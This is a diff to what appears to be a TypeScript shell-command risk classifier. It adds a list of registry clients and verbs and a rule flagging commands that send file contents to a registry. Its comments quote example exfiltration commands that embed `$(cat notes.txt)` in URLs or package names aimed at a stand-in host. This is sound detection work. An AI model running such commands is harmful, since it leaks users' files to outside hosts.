@@ -1838,6 +1838,24 @@ function saysLittle(inner: string): boolean {
   }
   return true;
 }
+/** Registries' clients and their verbs that send the names they are given to a registry (sendsContents: y10-4). */
+const REGISTRY_VERBS: Readonly<Record<string, ReadonlySet<string>>> = (() => {
+  // (`docker inspect` and the like ask this computer's daemon; skopeo, crane, oras and regctl only ever ask a registry.)
+  const images = new Set(["pull", "push", "search", "manifest", "login"]);
+  const remote = new Set(["inspect", "copy", "list-tags", "ls", "cat", "fetch", "digest", "pull", "push", "manifest", "config", "blob", "tag", "image", "repo", "artifact", "discover", "attach", "login"]);
+  const node = new Set(["view", "v", "info", "show", "search", "s", "find", "install", "i", "add", "exec", "dlx", "x", "create", "init", "outdated", "dist-tag", "access", "owner", "deprecate", "publish", "unpublish"]);
+  const py = new Set(["index", "download", "install", "search"]);
+  const out: Record<string, ReadonlySet<string>> = {};
+  for (const k of ["docker", "podman", "nerdctl", "buildah"]) out[k] = images;
+  for (const k of ["skopeo", "crane", "oras", "regctl"]) out[k] = remote;
+  for (const k of ["npm", "pnpm", "yarn", "bun"]) out[k] = node;
+  for (const k of ["pip", "pip3", "pipx", "poetry"]) out[k] = py;
+  out.gem = new Set(["search", "query", "install", "fetch", "list", "specification"]);
+  out.cargo = new Set(["search", "install", "add", "info"]);
+  out.go = new Set(["get", "install"]);
+  out.helm = new Set(["pull", "push", "install", "upgrade", "search", "show", "template", "fetch"]);
+  return out;
+})();
 /** Programs whose words are, or hold, a command line they hand to a shell: judged there (nested()), never as their own files. */
 const NESTS_TEXT = new Set(["sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "cmd", "powershell", "pwsh", "wsl", "watch", "flock", "script", "su", "runuser", "ssh", "slogin", "parallel", "eval", "source", "."]);
 const fetches = (key: string): boolean => FETCHERS.has(key) || TEXT_FETCHERS.has(key);
@@ -3897,9 +3915,18 @@ class Engine extends Classifier {
     const says = "May send what a file or a command holds to another computer.";
     if (!FETCHERS.has(key) && !PS_SENDERS.has(key)) {
       // Any other program given a web address that holds what a command or a read gave sends it as well (`git
-      // ls-remote "https://x.io/$(cat notes.txt)"`, `pip download …`: commands-classes-y9-6).
+      // ls-remote "https://x.io/$(cat notes.txt)"`, `pip download …`: commands-classes-y9-6), as an option's value too
+      // (`npm view x --registry=https://x.io/$(cat notes.txt)`: y10-4).
       const { own: words } = this.ownWords(args);
-      if (words.some(a => a.v === null && /^["']?(https?|ftps?|ssh|git):\/\//i.test(a.raw) && substituted(a.raw).some(inner => !saysLittle(inner)))) this.add("publish", "send.contents", says);
+      const reads = (a: Arg): boolean => a.v === null && substituted(a.raw).some(inner => !saysLittle(inner));
+      if (words.some(a => reads(a) && /^(?:--?[\w-]+=)?["']?(https?|ftps?|ssh|git|docker):\/\//i.test(a.raw))) { this.add("publish", "send.contents", says); return; }
+      // A registry's client asked for an image, a package or a search by a name that holds what a command or a read
+      // gave sends that to the registry (`docker pull x.io/$(cat notes.txt)`, `npm view $(cat notes.txt)`, `pip index
+      // versions $(cat notes.txt)`: y10-4). Only its verbs that reach a registry: `docker stop $(docker ps -q)` talks to
+      // this computer's own daemon.
+      const verbs = REGISTRY_VERBS[key];
+      const verb = words.find(a => a.v !== null && !a.v.startsWith("-"))?.v ?? "";
+      if (verbs?.has(verb) && words.some(reads)) this.add("publish", "send.contents", says);
       return;
     }
     // The address a cloud computer hands out its own sign-in at (the instance metadata service): what a fetch of it
